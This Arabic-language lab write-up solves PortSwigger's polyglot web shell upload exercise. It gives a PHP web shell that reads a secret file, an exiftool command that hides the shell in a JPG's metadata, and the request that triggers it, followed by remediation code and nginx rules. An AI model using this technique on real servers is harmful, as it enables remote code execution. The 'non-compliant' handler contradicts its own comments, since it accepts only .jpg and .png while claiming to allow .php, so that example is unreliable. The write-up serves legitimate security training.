# Lab: Remote code execution via polyglot web shell upload

> **Category:** File Upload Vulnerabilities  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة رفع الملفات (File Upload) حيث يتحقق الخادم من محتوى الملف للتأكد من أنه صورة حقيقية. نقوم بإنشاء ملف **Polyglot** (صورة حقيقية تحتوي على كود PHP في بياناتها الوصفية metadata) لتنفيذ Web Shell وقراءة `/home/carlos/secret`.

**الحساب:** `wiener:peter`

**المطلوب:** الحصول على السر (secret) وإرساله.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: إنشاء Web Shell عادي (سيفشل)

- أنشئ ملف `exploit.php` بالمحتوى:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

- حاول رفعه كـ avatar

**النتيجة:** يتم رفض الرفع (يسمح فقط بالصور الحقيقية)

### الخطوة 2: إنشاء ملف Polyglot باستخدام ExifTool

- احصل على صورة JPG عادية (أي صورة، مثلاً `image.jpg`)
- استخدم الأمر التالي لإنشاء ملف Polyglot:

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" image.jpg -o polyglot.php
```

**شرح الأمر:**
| الجزء | الوصف |
|-------|-------|
| `-Comment="..."` | يضيف الكود في حقل Comment في بيانات EXIF |
| `image.jpg` | الصورة الأصلية |
| `-o polyglot.php` | يحفظ الملف الناتج باسم `polyglot.php` |

**النتيجة:** ملف `polyglot.php` هو صورة JPG حقيقية + كود PHP في الـ metadata

### الخطوة 3: رفع الملف Polyglot

- ارفع `polyglot.php` كـ avatar
- **النتيجة:** يتم قبول الملف ✅ (الخادم يراه صورة حقيقية)

### الخطوة 4: تنفيذ Web Shell

- في Burp، ابحث عن طلب `GET /files/avatars/polyglot.php`
- أرسل الطلب

```http
GET /files/avatars/polyglot.php HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

### الخطوة 5: البحث عن السر في الرد

الرد سيكون صورة ثنائية (binary image data)، ولكن كود PHP سيتم تنفيذه وستظهر النتيجة داخل بيانات الصورة.

استخدم **Search** في Burp للبحث عن `START`:

```
START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END
```

**السر:** `2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ`

### الخطوة 6: إرسال السر

- انسخ السر
- ارجع إلى صفحة المختبر
- اضغط **Submit solution** والصق السر

### الخطوة 7: حل المختبر

بعد إرسال السر الصحيح، سيتم حل المختبر ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هو Polyglot file?** | ملف صالح بأكثر من تنسيق واحد (مثلاً صورة JPG وملف PHP في نفس الوقت) |
| **لماذا نجح هذا؟** | الخادم يتحقق من محتوى الملف (يرى صورة JPG صالحة)، ثم ينفذ كود PHP الموجود في الـ metadata |
| **ما هو ExifTool؟** | أداة لقراءة وكتابة البيانات الوصفية (metadata) في الصور |
| **لماذا نستخدم `START` و `END`؟** | لتسهيل البحث عن السر في الرد الثنائي |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الخادم يتحقق من أن الملف صورة حقيقية (باستخدام مكتبة فحص الصور)، ولكنه لا يمنع تنفيذ PHP في الملفات المرفوعة، ويسمح بتحميل ملفات بامتداد `.php`.

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// pages/api/upload.js
import fs from 'fs';
import path from 'path';
import formidable from 'formidable';
import sharp from 'sharp'; // مكتبة معالجة الصور

export default function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();
  
  const form = formidable({});
  
  form.parse(req, async (err, fields, files) => {
    const file = files.avatar;
    const filename = file.originalFilename;
    const extension = path.extname(filename).toLowerCase();
    
    // التحقق من الامتداد
    if (extension !== '.jpg' && extension !== '.png') {
      return res.status(400).json({ error: 'Invalid file type' });
    }
    
    // خطأ: يتحقق فقط من أن الملف صورة صالحة (لا يمنع التنفيذ)
    try {
      await sharp(file.filepath).metadata();
      // الملف صورة صالحة ✅
    } catch {
      return res.status(400).json({ error: 'Invalid image' });
    }
    
    // خطأ: يسمح برفع .php (طالما هو صورة صالحة)
    const targetPath = path.join(process.cwd(), 'public/files/avatars', filename);
    fs.copyFileSync(file.filepath, targetPath);
    
    res.json({ success: true, filename });
  });
}
```

```nginx
# إعدادات Nginx - يسمح بتنفيذ PHP في مجلد avatars
location /files/avatars {
    location ~ \.php$ {
        include fastcgi_params;
        fastcgi_pass php-fpm;
    }
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// pages/api/upload.js
import fs from 'fs';
import path from 'path';
import formidable from 'formidable';
import sharp from 'sharp';
import { v4 as uuidv4 } from 'uuid';

export default function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();
  
  const form = formidable({});
  
  form.parse(req, async (err, fields, files) => {
    const file = files.avatar;
    const originalFilename = file.originalFilename;
    const extension = path.extname(originalFilename).toLowerCase();
    
    // التصحيح 1: whitelist للامتدادات الآمنة فقط
    const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif'];
    if (!allowedExtensions.includes(extension)) {
      return res.status(400).json({ error: 'File type not allowed' });
    }
    
    // التصحيح 2: التحقق من أن الملف صورة صالحة
    let isImage = false;
    try {
      const metadata = await sharp(file.filepath).metadata();
      isImage = metadata.format !== undefined;
    } catch {
      isImage = false;
    }
    
    if (!isImage) {
      return res.status(400).json({ error: 'Invalid image file' });
    }
    
    // التصحيح 3: إعادة تسمية الملف (لا نحتفظ بـ .php أبداً)
    const safeFilename = `${uuidv4()}${extension}`;
    const uploadDir = path.join(process.cwd(), 'public/files/avatars');
    const targetPath = path.join(uploadDir, safeFilename);
    
    fs.copyFileSync(file.filepath, targetPath);
    
    res.json({ success: true, filename: safeFilename });
  });
}
```

```nginx
# إعدادات Nginx - منع تنفيذ PHP في مجلد الملفات المرفوعة تماماً
location /files/avatars {
    location ~ \.php$ {
        return 403;
    }
}
```

**الخلاصة:** 
1. لا تسمح برفع ملفات بامتداد `.php` أبداً
2. أعد تسمية الملفات (لا تحتفظ بالامتداد الأصلي)
3. عطل تنفيذ PHP في مجلد الرفع عبر إعدادات الخادم
4. خزّن الملفات خارج المجلد القابل للتنفيذ

---

## 🛡️ كيفية الوقاية (How to Prevent)

| الإجراء | الوصف |
|---------|-------|
| **منع امتداد `.php`** | لا تسمح برفع أي ملف بامتداد `.php` |
| **إعادة تسمية الملف** | استخدم أسماء عشوائية (UUID) مع الامتداد الأصلي الآمن |
| **تعطيل التنفيذ** | امنع تنفيذ PHP في مجلد الملفات المرفوعة |
| **فحص المحتوى** | استخدم مكتبات فحص الصور (مثل Sharp) |
| **تخزين خارج webroot** | ضع الملفات خارج المجلد العام كلما أمكن |

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)
- [ExifTool](https://exiftool.org/)
- [Polyglot Files](https://portswigger.net/web-security/file-upload/polyglot)
- [File Upload Cheat Sheet](https://portswigger.net/web-security/file-upload)

